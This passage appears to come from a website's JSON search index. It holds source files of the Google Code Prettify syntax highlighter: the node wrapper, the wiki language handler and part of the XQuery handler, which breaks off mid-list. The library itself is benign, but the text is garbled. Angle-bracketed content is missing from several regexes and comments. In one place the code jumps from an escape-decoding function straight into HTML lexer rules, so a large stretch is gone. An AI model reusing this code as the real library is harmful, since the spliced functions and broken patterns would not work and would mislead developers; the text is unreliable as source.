@const */ var PR_KEYWORD = 'kwd'; /** * token style for a comment * @const */ var PR_COMMENT = 'com'; /** * token style for a type * @const */ var PR_TYPE = 'typ'; /** * token style for a literal value. e.g. 1, null, true. * @const */ var PR_LITERAL = 'lit'; /** * token style for a punctuation string. * @const */ var PR_PUNCTUATION = 'pun'; /** * token style for plain text. * @const */ var PR_PLAIN = 'pln'; /** * token style for an sgml tag. * @const */ var PR_TAG = 'tag'; /** * token style for a markup declaration such as a DOCTYPE. * @const */ var PR_DECLARATION = 'dec'; /** * token style for embedded source. * @const */ var PR_SOURCE = 'src'; /** * token style for an sgml attribute name. * @const */ var PR_ATTRIB_NAME = 'atn'; /** * token style for an sgml attribute value. * @const */ var PR_ATTRIB_VALUE = 'atv'; /** * A class that indicates a section of markup that is not code, e.g. to allow * embedding of line numbers within code listings. * @const */ var PR_NOCODE = 'nocode'; // Regex pattern below is automatically generated by regexpPrecederPatterns.pl // Do not modify, your changes will be erased. // CAVEAT: this does not properly handle the case where a regular // expression immediately follows another since a regular expression may // have flags for case-sensitivity and the like. Having regexp tokens // adjacent is not valid in any language I'm aware of, so I'm punting. // TODO: maybe style special characters inside a regexp as punctuation. /** * A set of tokens that can precede a regular expression literal in * javascript * http://web.archive.org/web/20070717142515/http://www.mozilla.org/js/language/js20/rationale/syntax.html * has the full list, but I've removed ones that might be problematic when * seen in languages that don't support regular expression literals. * * Specifically, I've removed any keywords that can't precede a regexp * literal in a syntactically legal javascript program, and I've removed the * \"in\" keyword since it's not a keyword in many languages, and might be used * as a count of inches. * * The link above does not accurately describe EcmaScript rules since * it fails to distinguish between (a=++/b/i) and (a++/b/i) but it works * very well in practice. * * @private * @const */ var REGEXP_PRECEDER_PATTERN = '(?:^^\\\\.?|[+-]|[!=]=?=?|\\\\#|%=?|&&?=?|\\\\(|\\\\*=?|[+\\\\-]=|->|\\\\/=?|::?|?>?=?|,|;|\\\\?|@|\\\\[|~|{|\\\\^\\\\^?=?|\\\\|\\\\|?=?|break|case|continue|delete|do|else|finally|instanceof|return|throw|try|typeof)\\\\s*'; /** * Given a group of {@link RegExp}s, returns a {@code RegExp} that globally * matches the union of the sets of strings matched by the input RegExp. * Since it matches globally, if the input strings have a start-of-input * anchor (/^.../), it is ignored for the purposes of unioning. * @param {Array.} regexs non multiline, non-global regexs. * @return {RegExp} a global regex. */ function combinePrefixPatterns(regexs) { var capturedGroupIndex = 0; var needToFoldCase = false; var ignoreCase = false; for (var i = 0, n = regexs.length; i < n; ++i) { var regex = regexs[i]; if (regex.ignoreCase) { ignoreCase = true; } else if (/[a-z]/i.test(regex.source.replace( /\\\\u[0-9a-f]{4}|\\\\x[0-9a-f]{2}|\\\\[^ux]/gi, ''))) { needToFoldCase = true; ignoreCase = false; break; } } var escapeCharToCodeUnit = { 'b': 8, 't': 9, 'n': 0xa, 'v': 0xb, 'f': 0xc, 'r': 0xd }; function decodeEscape(charsetPart) { var cc0 = charsetPart.charCodeAt(0); if (cc0 !== 92 /* \\\\ */) { return cc0; } var c1 = charsetPart.charAt(1); cc0 = escapeCharToCodeUnit[c1]; if (cc0) { return cc0; } else if ('0' /i], // Unescaped content in javascript. (Or possibly vbscript). ['lang-js', /^]*>([\\s\\S]*?)(]*>)/i], // Contains unescaped stylesheet content ['lang-css', /^]*>([\\s\\S]*?)(]*>)/i], ['lang-in.tag', /^()/i] ]), ['default-markup', 'htm', 'html', 'mxml', 'xhtml', 'xml', 'xsl']); registerLangHandler( createSimpleLexer( [ [PR_PLAIN, /^[\\s]+/, null, ' \\t\\r\\n'], [PR_ATTRIB_VALUE, /^(?:\\\"[^\\\"]*\\\"?|\\'[^\\']*\\'?)/, null, '\\\"\\''] ], [ [PR_TAG, /^^$/i], [PR_ATTRIB_NAME, /^(?!style[\\s=]|on)[a-z](?:[\\w:-]*\\w)?/i], ['lang-uq.val', /^=\\s*([^>\\'\\\"\\s]*(?:[^>\\'\\\"\\s\\/]|\\/(?=\\s)))/], [PR_PUNCTUATION, /^[=\\/]+/], ['lang-js', /^on\\w+\\s*=\\s*\\\"([^\\\"]+)\\\"/i], ['lang-js', /^on\\w+\\s*=\\s*\\'([^\\']+)\\'/i], ['lang-js', /^on\\w+\\s*=\\s*([^\\\"\\'>\\s]+)/i], ['lang-css', /^style\\s*=\\s*\\\"([^\\\"]+)\\\"/i], ['lang-css', /^style\\s*=\\s*\\'([^\\']+)\\'/i], ['lang-css', /^style\\s*=\\s*([^\\\"\\'>\\s]+)/i] ]), ['in.tag']); registerLangHandler( createSimpleLexer([], [[PR_ATTRIB_VALUE, /^[\\s\\S]+/]]), ['uq.val']); registerLangHandler(sourceDecorator({ 'keywords': CPP_KEYWORDS, 'hashComments': true, 'cStyleComments': true, 'types': C_TYPES }), ['c', 'cc', 'cpp', 'cxx', 'cyc', 'm']); registerLangHandler(sourceDecorator({ 'keywords': 'null,true,false' }), ['json']); registerLangHandler(sourceDecorator({ 'keywords': CSHARP_KEYWORDS, 'hashComments': true, 'cStyleComments': true, 'verbatimStrings': true, 'types': C_TYPES }), ['cs']); registerLangHandler(sourceDecorator({ 'keywords': JAVA_KEYWORDS, 'cStyleComments': true }), ['java']); registerLangHandler(sourceDecorator({ 'keywords': SH_KEYWORDS, 'hashComments': true, 'multiLineStrings': true }), ['bash', 'bsh', 'csh', 'sh']); registerLangHandler(sourceDecorator({ 'keywords': PYTHON_KEYWORDS, 'hashComments': true, 'multiLineStrings': true, 'tripleQuotedStrings': true }), ['cv', 'py', 'python']); registerLangHandler(sourceDecorator({ 'keywords': PERL_KEYWORDS, 'hashComments': true, 'multiLineStrings': true, 'regexLiterals': 2 // multiline regex literals }), ['perl', 'pl', 'pm']); registerLangHandler(sourceDecorator({ 'keywords': RUBY_KEYWORDS, 'hashComments': true, 'multiLineStrings': true, 'regexLiterals': true }), ['rb', 'ruby']); registerLangHandler(sourceDecorator({ 'keywords': JSCRIPT_KEYWORDS, 'cStyleComments': true, 'regexLiterals': true }), ['javascript', 'js', 'ts', 'typescript']); registerLangHandler(sourceDecorator({ 'keywords': COFFEE_KEYWORDS, 'hashComments': 3, // ### style block comments 'cStyleComments': true, 'multilineStrings': true, 'tripleQuotedStrings': true, 'regexLiterals': true }), ['coffee']); registerLangHandler( createSimpleLexer([], [[PR_STRING, /^[\\s\\S]+/]]), ['regex']); /** @param {JobT} job */ function applyDecorator(job) { var opt_langExtension = job.langExtension; try { // Extract tags, and convert the source code to plain text. var sourceAndSpans = extractSourceSpans(job.sourceNode, job.pre); /** Plain text. @type {string} */ var source = sourceAndSpans.sourceCode; job.sourceCode = source; job.spans = sourceAndSpans.spans; job.basePos = 0; // Apply the appropriate language handler langHandlerForExtension(opt_langExtension, source)(job); // Integrate the decorations and tags back into the source code, // modifying the sourceNode in place. recombineTagsAndDecorations(job); } catch (e) { if (win['console']) { console['log'](e && e['stack'] || e); } } } /** * Pretty print a chunk of code. * @param sourceCodeHtml {string} The HTML to pretty print. * @param opt_langExtension {string} The language name to use. * Typically, a filename extension like 'cpp' or 'java'. * @param opt_numberLines {number|boolean} True to number lines, * or the 1-indexed number of the first line in sourceCodeHtml. */ function $prettyPrintOne(sourceCodeHtml, opt_langExtension, opt_numberLines) { /** @type{number|boolean} */ var nl = opt_numberLines || false; /** @type{string|null} */ var langExtension = opt_langExtension || null; /** @type{!Element} */ var container = document.createElement('div'); // This could cause images to load and onload listeners to fire. // E.g. . // We assume that the inner HTML is from a trusted source. // The pre-tag is required for IE8 which strips newlines from innerHTML // when it is injected into a tag. // http://stackoverflow.com/questions/451486/pre-tag-loses-line-breaks-when-setting-innerhtml-in-ie // http://stackoverflow.com/questions/195363/inserting-a-newline-into-a-pre-tag-ie-javascript container.innerHTML = '' + sourceCodeHtml + ''; container = /** @type{!Element} */(container.firstChild); if (nl) { numberLines(container, nl, true); } /** @type{JobT} */ var job = { langExtension: langExtension, numberLines: nl, sourceNode: container, pre: 1, sourceCode: null, basePos: null, spans: null, decorations: null }; applyDecorator(job); return container.innerHTML; } /** * Find all the {@code } and {@code } tags in the DOM with * {@code class=prettyprint} and prettify them. * * @param {Function} opt_whenDone called when prettifying is done. * @param {HTMLElement|HTMLDocument} opt_root an element or document * containing all the elements to pretty print. * Defaults to {@code document.body}. */ function $prettyPrint(opt_whenDone, opt_root) { var root = opt_root || document.body; var doc = root.ownerDocument || document; function byTagName(tn) { return root.getElementsByTagName(tn); } // fetch a list of nodes to rewrite var codeSegments = [byTagName('pre'), byTagName('code'), byTagName('xmp')]; var elements = []; for (var i = 0; i < codeSegments.length; ++i) { for (var j = 0, n = codeSegments[i].length; j < n; ++j) { elements.push(codeSegments[i][j]); } } codeSegments = null; var clock = Date; if (!clock['now']) { clock = { 'now': function () { return +(new Date); } }; } // The loop is broken into a series of continuations to make sure that we // don't make the browser unresponsive when rewriting a large page. var k = 0; var langExtensionRe = /\\blang(?:uage)?-([\\w.]+)(?!\\S)/; var prettyPrintRe = /\\bprettyprint\\b/; var prettyPrintedRe = /\\bprettyprinted\\b/; var preformattedTagNameRe = /pre|xmp/i; var codeRe = /^code$/i; var preCodeXmpRe = /^(?:pre|code|xmp)$/i; var EMPTY = {}; function doWork() { var endTime = (win['PR_SHOULD_USE_CONTINUATION'] ? clock['now']() + 250 /* ms */ : Infinity); for (; k < elements.length && clock['now']() < endTime; k++) { var cs = elements[k]; // Look for a preceding comment like // var attrs = EMPTY; { for (var preceder = cs; (preceder = preceder.previousSibling);) { var nt = preceder.nodeType; // is parsed by HTML 5 to a comment node (8) // like , but in XML is a processing instruction var value = (nt === 7 || nt === 8) && preceder.nodeValue; if (value ? !/^\\??prettify\\b/.test(value) : (nt !== 3 || /\\S/.test(preceder.nodeValue))) { // Skip over white-space text nodes but not others. break; } if (value) { attrs = {}; value.replace( /\\b(\\w+)=([\\w:.%+-]+)/g, function (_, name, value) { attrs[name] = value; }); break; } } } var className = cs.className; if ((attrs !== EMPTY || prettyPrintRe.test(className)) // Don't redo this if we've already done it. // This allows recalling pretty print to just prettyprint elements // that have been added to the page since last call. && !prettyPrintedRe.test(className)) { // make sure this is not nested in an already prettified element var nested = false; for (var p = cs.parentNode; p; p = p.parentNode) { var tn = p.tagName; if (preCodeXmpRe.test(tn) && p.className && prettyPrintRe.test(p.className)) { nested = true; break; } } if (!nested) { // Mark done. If we fail to prettyprint for whatever reason, // we shouldn't try again. cs.className += ' prettyprinted'; // If the classes includes a language extensions, use it. // Language extensions can be specified like // // the language extension \"cpp\" is used to find a language handler // as passed to PR.registerLangHandler. // HTML5 recommends that a language be specified using \"language-\" // as the prefix instead. Google Code Prettify supports both. // http://dev.w3.org/html5/spec-author-view/the-code-element.html var langExtension = attrs['lang']; if (!langExtension) { langExtension = className.match(langExtensionRe); // Support var wrapper; if (!langExtension && (wrapper = childContentWrapper(cs)) && codeRe.test(wrapper.tagName)) { langExtension = wrapper.className.match(langExtensionRe); } if (langExtension) { langExtension = langExtension[1]; } } var preformatted; if (preformattedTagNameRe.test(cs.tagName)) { preformatted = 1; } else { var currentStyle = cs['currentStyle']; var defaultView = doc.defaultView; var whitespace = ( currentStyle ? currentStyle['whiteSpace'] : (defaultView && defaultView.getComputedStyle) ? defaultView.getComputedStyle(cs, null) .getPropertyValue('white-space') : 0); preformatted = whitespace && 'pre' === whitespace.substring(0, 3); } // Look for a class like linenums or linenums: where is the // 1-indexed number of the first line. var lineNums = attrs['linenums']; if (!(lineNums = lineNums === 'true' || +lineNums)) { lineNums = className.match(/\\blinenums\\b(?::(\\d+))?/); lineNums = lineNums ? lineNums[1] && lineNums[1].length ? +lineNums[1] : true : false; } if (lineNums) { numberLines(cs, lineNums, preformatted); } // do the pretty printing var prettyPrintingJob = { langExtension: langExtension, sourceNode: cs, numberLines: lineNums, pre: preformatted, sourceCode: null, basePos: null, spans: null, decorations: null }; applyDecorator(prettyPrintingJob); } } } if (k < elements.length) { // finish up in a continuation win.setTimeout(doWork, 250); } else if ('function' === typeof opt_whenDone) { opt_whenDone(); } } doWork(); } /** * Contains functions for creating and registering new language handlers. * @type {Object} */ var PR = win['PR'] = { 'createSimpleLexer': createSimpleLexer, 'registerLangHandler': registerLangHandler, 'sourceDecorator': sourceDecorator, 'PR_ATTRIB_NAME': PR_ATTRIB_NAME, 'PR_ATTRIB_VALUE': PR_ATTRIB_VALUE, 'PR_COMMENT': PR_COMMENT, 'PR_DECLARATION': PR_DECLARATION, 'PR_KEYWORD': PR_KEYWORD, 'PR_LITERAL': PR_LITERAL, 'PR_NOCODE': PR_NOCODE, 'PR_PLAIN': PR_PLAIN, 'PR_PUNCTUATION': PR_PUNCTUATION, 'PR_SOURCE': PR_SOURCE, 'PR_STRING': PR_STRING, 'PR_TAG': PR_TAG, 'PR_TYPE': PR_TYPE, 'prettyPrintOne': IN_GLOBAL_SCOPE ? (win['prettyPrintOne'] = $prettyPrintOne) : (prettyPrintOne = $prettyPrintOne), 'prettyPrint': IN_GLOBAL_SCOPE ? (win['prettyPrint'] = $prettyPrint) : (prettyPrint = $prettyPrint) }; // Make PR available via the Asynchronous Module Definition (AMD) API. // Per https://github.com/amdjs/amdjs-api/wiki/AMD: // The Asynchronous Module Definition (AMD) API specifies a // mechanism for defining modules such that the module and its // dependencies can be asynchronously loaded. // ... // To allow a clear indicator that a global define function (as // needed for script src browser loading) conforms to the AMD API, // any global define function SHOULD have a property called \"amd\" // whose value is an object. This helps avoid conflict with any // other existing JavaScript code that could have defined a define() // function that does not conform to the AMD API. var define = win['define']; if (typeof define === \"function\" && define['amd']) { define(\"google-code-prettify\", [], function () { return PR; }); } })(); var path = require('path'); module.exports = { prettyPrint: prettyPrint, prettyPrintOne: prettyPrintOne, // include paths for css preprocessor support includePaths: [ __dirname, path.resolve(__dirname, '../styles') ] };","link":"/plugins/prettify/node_prettify.js"},{"title":"","text":"/** * @license * Copyright (C) 2009 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Wiki pages. * * Based on WikiSyntax at http://code.google.com/p/support/wiki/WikiSyntax * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace [PR['PR_PLAIN'], /^[\\t \\xA0a-gi-z0-9]+/, null, '\\t \\xA0abcdefgijklmnopqrstuvwxyz0123456789'], // Wiki formatting [PR['PR_PUNCTUATION'], /^[=*~\\^\\[\\]]+/, null, '=*~^[]'] ], [ // Meta-info like #summary, #labels, etc. ['lang-wiki.meta', /(?:^^|\\r\\n?|\\n)(#[a-z]+)\\b/], // A WikiWord [PR['PR_LITERAL'], /^(?:[A-Z][a-z][a-z0-9]+[A-Z][a-z][a-zA-Z0-9]+)\\b/ ], // A preformatted block in an unknown language ['lang-', /^\\{\\{\\{([\\s\\S]+?)\\}\\}\\}/], // A block of source code in an unknown language ['lang-', /^`([^\\r\\n`]+)`/], // An inline URL. [PR['PR_STRING'], /^https?:\\/\\/[^\\/?#\\s]*(?:\\/[^?#\\s]*)?(?:\\?[^#\\s]*)?(?:#\\S*)?/i], [PR['PR_PLAIN'], /^(?:\\r\\n|[\\s\\S])[^#=*~^A-Zh\\{`\\[\\r\\n]*/] ]), ['wiki']); PR['registerLangHandler']( PR['createSimpleLexer']([[PR['PR_KEYWORD'], /^#[a-z]+/i, null, '#']], []), ['wiki.meta']);","link":"/plugins/prettify/lang-wiki.js"},{"title":"","text":"/** * @license * Copyright (C) 2011 Patrick Wied * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for XQuery. * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * * * * @author Patrick Wied ( patpa7p@live.de ) * @version 2010-09-28 */ (function () { // Falls back to plain for stylesheets that don't style fun. var PR_FUNCTION = 'fun pln'; // Falls back to plaiin for stylesheets that don't style var. var PR_VARIABLE = 'var pln'; PR['registerLangHandler']( PR['createSimpleLexer']( [ // Matching $var-ia_bles [PR_VARIABLE, /^\\$[A-Za-z0-9_\\-]+/, null, \"$\"] ], [ // Matching lt and gt operators // Not the best matching solution but you have to differentiate between the gt operator and the tag closing char [PR['PR_PLAIN'], /^[\\s=][][\\s=]/], // Matching @Attributes [PR['PR_LITERAL'], /^\\@[\\w-]+/], // Matching xml tags [PR['PR_TAG'], /^$/i], // Matching single or multiline xquery comments -> (: :) [PR['PR_COMMENT'], /^\\(:[\\s\\S]*?:\\)/], // Tokenizing /{}:=;*,[]() as plain [PR['PR_PLAIN'], /^[\\/\\{\\};,\\[\\]\\(\\)]$/], // Matching a double or single quoted, possibly multi-line, string. // with the special condition that a { in a string changes to xquery context [PR['PR_STRING'], /^(?:\\\"(?:[^\\\"\\\\\\{]|\\\\[\\s\\S])*(?:\\\"|$)|\\'(?:[^\\'\\\\\\{]|\\\\[\\s\\S])*(?:\\'|$))/, null, '\"\\''], // Matching standard xquery keywords [PR['PR_KEYWORD'], /^(?:xquery|where|version|variable|union|typeswitch|treat|to|then|text|stable|sortby|some|self|schema|satisfies|returns|return|ref|processing-instruction|preceding-sibling|preceding|precedes|parent|only|of|node|namespace|module|let|item|intersect|instance|in|import|if|function|for|follows|following-sibling|following|external|except|every|else|element|descending|descendant-or-self|descendant|define|default|declare|comment|child|cast|case|before|attribute|assert|ascending|as|ancestor-or-self|ancestor|after|eq|order|by|or|and|schema-element|document-node|node|at)\\b/], // Matching standard xquery types [PR['PR_TYPE'], /^(?:xs:yearMonthDuration|xs:unsignedLong|xs:time|xs:string|xs:short|xs:QName|xs:Name|xs:long|xs:integer|xs:int|xs:gYearMonth|xs:gYear|xs:gMonthDay|xs:gDay|xs:float|xs:duration|xs:double|xs:decimal|xs:dayTimeDuration|xs:dateTime|xs:date|xs:byte|xs:boolean|xs:anyURI|xf:yearMonthDuration)\\b/, null], // Matching standard xquery functions [PR_FUNCTION, /^(?:xp:dereference|xinc:node-expand|xinc:link-references|xinc:link-expand|xhtml:restructure|xhtml:clean|xhtml:add-lists|xdmp:zip-manifest|xdmp:zip-get|xdmp:zip-create|xdmp:xquery-version|xdmp:word-convert|xdmp:with-namespaces|xdmp:version|xdmp:value|xdmp:user-roles|xdmp:user-last-login|xdmp:user|xdmp:url-encode|xdmp:url-decode|xdmp:uri-is-file|xdmp:uri-format|xdmp:uri-content-type|xdmp:unquote|xdmp:unpath|xdmp:triggers-database|xdmp:trace|xdmp:to-json|xdmp:tidy|xdmp:subbinary|xdmp:strftime|xdmp:spawn-in|xdmp:spawn|xdmp:sleep|xdmp:shutdown|xdmp:set-session-field|xdmp:set-response-encoding|xdmp:set-response-content-type|xdmp:set-response-code|xdmp:set-request-time-limit|xdmp:set|xdmp:servers|xdmp:server-status|xdmp:server-name|xdmp:server|xdmp:security-database|xdmp:security-assert|xdmp:schema-database|xdmp:save|xdmp:role-roles|xdmp:role|xdmp:rethrow|xdmp:restart|xdmp:request-timestamp|xdmp:request-status|xdmp:request-cancel|xdmp:request|xdmp:redirect-response|xdmp:random|xdmp:quote|xdmp:query-trace|xdmp:query-meters|xdmp:product-edition|xdmp:privilege-roles|xdmp:privilege|xdmp:pretty-print|xdmp:powerpoint-convert|xdmp:platform|xdmp:permission|xdmp:pdf-convert|xdmp:path|xdmp:octal-to-integer|xdmp:node-uri|xdmp:node-replace|xdmp:node-kind|xdmp:node-insert-child|xdmp:node-insert-before|xdmp:node-insert-after|xdmp:node-delete|xdmp:node-database|xdmp:mul64|xdmp:modules-root|xdmp:modules-database|xdmp:merging|xdmp:merge-cancel|xdmp:merge|xdmp:md5|xdmp:logout|xdmp:login|xdmp:log-level|xdmp:log|xdmp:lock-release|xdmp:lock-acquire|xdmp:load|xdmp:invoke-in|xdmp:invoke|xdmp:integer-to-octal|xdmp:integer-to-hex|xdmp:http-put|xdmp:http-post|xdmp:http-options|xdmp:http-head|xdmp:http-get|xdmp:http-delete|xdmp:hosts|xdmp:host-status|xdmp:host-name|xdmp:host|xdmp:hex-to-integer|xdmp:hash64|xdmp:hash32|xdmp:has-privilege|xdmp:groups|xdmp:group-serves|xdmp:group-servers|xdmp:group-name|xdmp:group-hosts|xdmp:group|xdmp:get-session-field-names|xdmp:get-session-field|xdmp:get-response-encoding|xdmp:get-response-code|xdmp:get-request-username|xdmp:get-request-user|xdmp:get-request-url|xdmp:get-request-protocol|xdmp:get-request-path|xdmp:get-request-method|xdmp:get-request-header-names|xdmp:get-request-header|xdmp:get-request-field-names|xdmp:get-request-field-filename|xdmp:get-request-field-content-type|xdmp:get-request-field|xdmp:get-request-client-certificate|xdmp:get-request-client-address|xdmp:get-request-body|xdmp:get-current-user|xdmp:get-current-roles|xdmp:get|xdmp:function-name|xdmp:function-module|xdmp:function|xdmp:from-json|xdmp:forests|xdmp:forest-status|xdmp:forest-restore|xdmp:forest-restart|xdmp:forest-name|xdmp:forest-delete|xdmp:forest-databases|xdmp:forest-counts|xdmp:forest-clear|xdmp:forest-backup|xdmp:forest|xdmp:filesystem-file|xdmp:filesystem-directory|xdmp:exists|xdmp:excel-convert|xdmp:eval-in|xdmp:eval|xdmp:estimate|xdmp:email|xdmp:element-content-type|xdmp:elapsed-time|xdmp:document-set-quality|xdmp:document-set-property|xdmp:document-set-properties|xdmp:document-set-permissions|xdmp:document-set-collections|xdmp:document-remove-properties|xdmp:document-remove-permissions|xdmp:document-remove-collections|xdmp:document-properties|xdmp:document-locks|xdmp:document-load|xdmp:document-insert|xdmp:document-get-quality|xdmp:document-get-properties|xdmp:document-get-permissions|xdmp:document-get-collections|xdmp:document-get|xdmp:document-forest|xdmp:document-delete|xdmp:document-add-properties|xdmp:document-add-permissions|xdmp:document-add-collections|xdmp:directory-properties|xdmp:directory-locks|xdmp:directory-delete|xdmp:directory-create|xdmp:directory|xdmp:diacritic-less|xdmp:describe|xdmp:default-permissions|xdmp:default-collections|xdmp:databases|xdmp:database-restore-validate|xdmp:database-restore-status|xdmp:database-restore-cancel|xdmp:database-restore|xdmp:database-name|xdmp:database-forests|xdmp:database-backup-validate|xdmp:database-backup-status|xdmp:database-backup-purge|xdmp:database-backup-cancel|xdmp:database-backup|xdmp:database|xdmp:collection-properties|xdmp:collection-locks|xdmp:collection-delete|xdmp:collation-canonical-uri|xdmp:castable-as|xdmp:can-grant-roles|xdmp:base64-encode|xdmp:base64-decode|xdmp:architecture|xdmp:apply|xdmp:amp-roles|xdmp:amp|xdmp:add64|xdmp:add-response-header|xdmp:access|trgr:trigger-set-recursive|trgr:trigger-set-permissions|trgr:trigger-set-name|trgr:trigger-set-module|trgr:trigger-set-event|trgr:trigger-set-description|trgr:trigger-remove-permissions|trgr:trigger-module|trgr:trigger-get-permissions|trgr:trigger-enable|trgr:trigger-disable|trgr:trigger-database-online-event|trgr:trigger-data-event|trgr:trigger-add-permissions|trgr:remove-trigger|trgr:property-content|trgr:pre-commit|trgr:post-commit|trgr:get-trigger-by-id|trgr:get-trigger|trgr:document-scope|trgr:document-content|trgr:directory-scope|trgr:create-trigger|trgr:collection-scope|trgr:any-property-content|thsr:set-entry|thsr:remove-term|thsr:remove-synonym|thsr:remove-entry|thsr:query-lookup|thsr:lookup|thsr:load|thsr:insert|thsr:expand|thsr:add-synonym|spell:suggest-detailed|spell:suggest|spell:remove-word|spell:make-dictionary|spell:load|spell:levenshtein-distance|spell:is-correct|spell:insert|spell:double-metaphone|spell:add-word|sec:users-collection|sec:user-set-roles|sec:user-set-password|sec:user-set-name|sec:user-set-description|sec:user-set-default-permissions|sec:user-set-default-collections|sec:user-remove-roles|sec:user-privileges|sec:user-get-roles|sec:user-get-description|sec:user-get-default-permissions|sec:user-get-default-collections|sec:user-doc-permissions|sec:user-doc-collections|sec:user-add-roles|sec:unprotect-collection|sec:uid-for-name|sec:set-realm|sec:security-version|sec:security-namespace|sec:security-installed|sec:security-collection|sec:roles-collection|sec:role-set-roles|sec:role-set-name|sec:role-set-description|sec:role-set-default-permissions|sec:role-set-default-collections|sec:role-remove-roles|sec:role-privileges|sec:role-get-roles|sec:role-get-description|sec:role-get-default-permissions|sec:role-get-default-collections|sec:role-doc-permissions|sec:role-doc-collections|sec:role-add-roles|sec:remove-user|sec:remove-role-from-users|sec:remove-role-from-role|sec:remove-role-from-privileges|sec:remove-role-from-amps|sec:remove-role|sec:remove-privilege|sec:remove-amp|sec:protect-collection|sec:privileges-collection|sec:privilege-set-roles|sec:privilege-set-name|sec:privilege-remove-roles|sec:privilege-get-roles|sec:privilege-add-roles|sec:priv-doc-permissions|sec:priv-doc-collections|sec:get-user-names|sec:get-unique-elem-id|sec:get-role-names|sec:get-role-ids|sec:get-privilege|sec:get-distinct-permissions|sec:get-collection|sec:get-amp|sec:create-user-with-role|sec:create-user|sec:create-role|sec:create-privilege|sec:create-amp|sec:collections-collection|sec:collection-set-permissions|sec:collection-remove-permissions|sec:collection-get-permissions|sec:collection-add-permissions|sec:check-admin|sec:amps-collection|sec:amp-set-roles|sec:amp-remove-roles|sec:amp-get-roles|sec:amp-doc-permissions|sec:amp-doc-collections|sec:amp-add-roles|search:unparse|search:suggest|search:snippet|search:search|search:resolve-nodes|search:resolve|search:remove-constraint|search:parse|search:get-default-options|search:estimate|search:check-options|prof:value|prof:reset|prof:report|prof:invoke|prof:eval|prof:enable|prof:disable|prof:allowed|ppt:clean|pki:template-set-request|pki:template-set-name|pki:template-set-key-type|pki:template-set-key-options|pki:template-set-description|pki:template-in-use|pki:template-get-version|pki:template-get-request|pki:template-get-name|pki:template-get-key-type|pki:template-get-key-options|pki:template-get-id|pki:template-get-description|pki:need-certificate|pki:is-temporary|pki:insert-trusted-certificates|pki:insert-template|pki:insert-signed-certificates|pki:insert-certificate-revocation-list|pki:get-trusted-certificate-ids|pki:get-template-ids|pki:get-template-certificate-authority|pki:get-template-by-name|pki:get-template|pki:get-pending-certificate-requests-xml|pki:get-pending-certificate-requests-pem|pki:get-pending-certificate-request|pki:get-certificates-for-template-xml|pki:get-certificates-for-template|pki:get-certificates|pki:get-certificate-xml|pki:get-certificate-pem|pki:get-certificate|pki:generate-temporary-certificate-if-necessary|pki:generate-temporary-certificate|pki:generate-template-certificate-authority|pki:generate-certificate-request|pki:delete-template|pki:delete-certificate|pki:create-template|pdf:make-toc|pdf:insert-toc-headers|pdf:get-toc|pdf:clean|p:status-transition|p:state-transition|p:remove|p:pipelines|p:insert|p:get-by-id|p:get|p:execute|p:create|p:condition|p:collection|p:action|ooxml:runs-merge|ooxml:package-uris|ooxml:package-parts-insert|ooxml:package-parts|msword:clean|mcgm:polygon|mcgm:point|mcgm:geospatial-query-from-elements|mcgm:geospatial-query|mcgm:circle|math:tanh|math:tan|math:sqrt|math:sinh|math:sin|math:pow|math:modf|math:log10|math:log|math:ldexp|math:frexp|math:fmod|math:floor|math:fabs|math:exp|math:cosh|math:cos|math:ceil|math:atan2|math:atan|math:asin|math:acos|map:put|map:map|map:keys|map:get|map:delete|map:count|map:clear|lnk:to|lnk:remove|lnk:insert|lnk:get|lnk:from|lnk:create|kml:polygon|kml:point|kml:interior-polygon|kml:geospatial-query-from-elements|kml:geospatial-query|kml:circle|kml:box|gml:polygon|gml:point|gml:interior-polygon|gml:geospatial-query-from-elements|gml:geospatial-query|gml:circle|gml:box|georss:point|georss:geospatial-query|georss:circle|geo:polygon|geo:point|geo:interior-polygon|geo:geospatial-query-from-elements|geo:geospatial-query|geo:circle|geo:box|fn:zero-or-one|fn:years-from-duration|fn:year-from-dateTime|fn:year-from-date|fn:upper-case|fn:unordered|fn:true|fn:translate|fn:trace|fn:tokenize|fn:timezone-from-time|fn:timezone-from-dateTime|fn:timezone-from-date|fn:sum|fn:subtract-dateTimes-yielding-yearMonthDuration|fn:subtract-dateTimes-yielding-dayTimeDuration|fn:substring-before|fn:substring-after|fn:substring|fn:subsequence|fn:string-to-codepoints|fn:string-pad|fn:string-length|fn:string-join|fn:string|fn:static-base-uri|fn:starts-with|fn:seconds-from-time|fn:seconds-from-duration|fn:seconds-from-dateTime|fn:round-half-to-even|fn:round|fn:root|fn:reverse|fn:resolve-uri|fn:resolve-QName|fn:replace|fn:remove|fn:QName|fn:prefix-from-QName|fn:position|fn:one-or-more|fn:number|fn:not|fn:normalize-unicode|fn:normalize-space|fn:node-name|fn:node-kind|fn:nilled|fn:namespace-uri-from-QName|fn:namespace-uri-for-prefix|fn:namespace-uri|fn:name|fn:months-from-duration|fn:month-from-dateTime|fn:month-from-date|fn:minutes-from-time|fn:minutes-from-duration|fn:minutes-from-dateTime|fn:min|fn:max|fn:matches|fn:lower-case|fn:local-name-from-QName|fn:local-name|fn:last|fn:lang|fn:iri-to-uri|fn:insert-before|fn:index-of|fn:in-scope-prefixes|fn:implicit-timezone|fn:idref|fn:id|fn:hours-from-time|fn:hours-from-duration|fn:hours-from-dateTime|fn:floor|fn:false|fn:expanded-QName|fn:exists|fn:exactly-one|fn:escape-uri|fn:escape-html-uri|fn:error|fn:ends-with|fn:encode-for-uri|fn:empty|fn:document-uri|fn:doc-available|fn:doc|fn:distinct-values|fn:distinct-nodes|fn:default-collation|fn:deep-equal|fn:days-from-duration|fn:day-from-dateTime|fn:day-from-date|fn:data|fn:current-time|fn:current-dateTime|fn:c